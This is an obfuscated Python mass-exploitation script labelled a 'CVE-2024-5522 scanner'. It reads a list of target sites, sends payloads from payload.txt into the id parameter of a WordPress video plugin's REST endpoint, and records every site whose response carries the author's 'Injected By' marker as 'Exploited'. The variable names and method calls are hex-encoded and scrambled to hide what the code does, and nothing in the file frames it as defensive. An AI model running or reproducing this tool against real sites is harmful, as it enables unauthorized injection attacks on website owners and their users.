lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI = open, input, getattr, __name__, print, bytes

from requests import get as IIIIIlIIIlllII
from requests.exceptions import RequestException as lIlIIIIIlIllll
IlIlIlIlIllIlIllII = 'payload.txt'
from colorama import Fore as IlllIllIIIIllI

def llIIllIllIlllIllIl():
    IlIIlllIlllIIlIlll = '\n       ______   ______    ___ ___  ___ ____     ____ ____ ___  ___ \n      / ___| | / / ______|_  / _ \\|_  / / /____/ __// __/|_  ||_  |\n     / /__ | |/ / _//___/ __/ // / __/_  _/___/__ \\/__ \\/ __// __/ \n     \\___/ |___/___/   /____\\___/____//_/    /____/____/____/____/ \n                                        CVE-2024-5522 scanner\n                                        made by KryptonSec_My\n    '
    llllllllllllIll(IlIIlllIlllIIlIlll)

def lllIIlIllllIlIlIlI(IlIIIIIlIllIlllllI):
    with lllllllllllllll(IlIIIIIlIllIlllllI, 'r') as IlIIlllIlllIIlIlll:
        return [lllllllllllllIl(IlIIlllIlllIIlIlll, lllllllllllllIl(llllllllllllIlI, 'fromhex')('7374726970').decode())() for IlIIlllIlllIIlIlll in lllllllllllllIl(IlIIlllIlllIIlIlll, lllllllllllllIl(llllllllllllIlI, 'fromhex')('726561646c696e6573').decode())()]

def IIlIIIIlllllllIIIl(IlIIIIIlIllIlllllI):
    with lllllllllllllll(IlIlIlIlIllIlIllII, 'r') as IlIIlllIlllIIlIlll:
        return [lllllllllllllIl(IlIIlllIlllIIlIlll, lllllllllllllIl(llllllllllllIlI, 'fromhex')('7374726970').decode())() for IlIIlllIlllIIlIlll in lllllllllllllIl(IlIIlllIlllIIlIlll, lllllllllllllIl(llllllllllllIlI, 'fromhex')('726561646c696e6573').decode())()]

def llIIllllIIlllIIllI(llIIlIIlIIlIIIIlIl, lIIIIllIlllIIIllIl, IIIlllIlIIlIllllIl):
    IlIIlllIlllIIlIlll = llIIlIIlIIlIIIIlIl
    if not lllllllllllllIl(IlIIlllIlllIIlIlll, lllllllllllllIl(llllllllllllIlI, 'fromhex')('73746172747377697468').decode())('http'):
        IlIIlllIlllIIlIlll = 'https://' + IlIIlllIlllIIlIlll
    IIIllIlIllIllIIllI = f'{IlIIlllIlllIIlIlll}/wp-json/h5vp/v1/video/0?id={lIIIIllIlllIIIllIl}'
    try:
        lllIIIIlllllllIlIl = IIIIIlIIIlllII(IIIllIlIllIllIIllI, timeout=10)
        if 'Injected By KryptonSec_My' in lllIIIIlllllllIlIl.text:
            llllllllllllIll(IlllIllIIIIllI.GREEN + f'[+] Target Has Been Exploit! :D {IlIIlllIlllIIlIlll}' + IlllIllIIIIllI.WHITE)
            lllllllllllllIl(IIIlllIlIIlIllllIl, lllllllllllllIl(llllllllllllIlI, 'fromhex')('617070656e64').decode())(IIIllIlIllIllIIllI)
        else:
            llllllllllllIll(IlllIllIIIIllI.RED + f'[-] {IlIIlllIlllIIlIlll} seems not vulnerable :(' + IlllIllIIIIllI.WHITE)
    except lIlIIIIIlIllll as IIIlIllIlIllIlIlII:
        llllllllllllIll(IlllIllIIIIllI.RED + f'[!] Error connecting to {IlIIlllIlllIIlIlll}: {IIIlIllIlIllIlIlII}' + IlllIllIIIIllI.WHITE)

def IIlllIllIllIIlIIll(IIlIIIllIllIllIlIl, IIlIIIlllIlIllIlIl):
    lllIIIIlllllllIlIl = lllIIlIllllIlIlIlI(IIlIIIllIllIllIlIl)
    IIIlIllIlIllIlIlII = IIlIIIIlllllllIIIl(IIlIIIlllIlIllIlIl)
    IlIIlllIlllIIlIlll = []
    for IIIllIlIllIllIIllI in lllIIIIlllllllIlIl:
        llllllllllllIll(IlllIllIIIIllI.CYAN + f'\n[Scanning {IIIllIlIllIllIIllI}]' + IlllIllIIIIllI.WHITE)
        for llllIlIIIIllllIllI in IIIlIllIlIllIlIlII:
            llIIllllIIlllIIllI(IIIllIlIllIllIIllI, llllIlIIIIllllIllI, IlIIlllIlllIIlIlll)
    if IlIIlllIlllIIlIlll:
        llllllllllllIll(IlllIllIIIIllI.BLUE + '\n[Exploited URLs]' + IlllIllIIIIllI.WHITE)
        for IlIIIIIIlIllIIllIl in IlIIlllIlllIIlIlll:
            llllllllllllIll(IlIIIIIIlIllIIllIl + IlllIllIIIIllI.CYAN + '\n[+]' + IlllIllIIIIllI.WHITE)
    else:
        llllllllllllIll(IlllIllIIIIllI.RED + '\nNo vulnerabilities found.' + IlllIllIIIIllI.WHITE)
if lllllllllllllII == '__main__':
    llIIllIllIlllIllIl()
    IIlIIIllIllIllIlIl = llllllllllllllI('Enter the path to the target list: ')
    IIlllIllIllIIlIIll(IIlIIIllIllIllIlIl, IlIlIlIlIllIlIllII)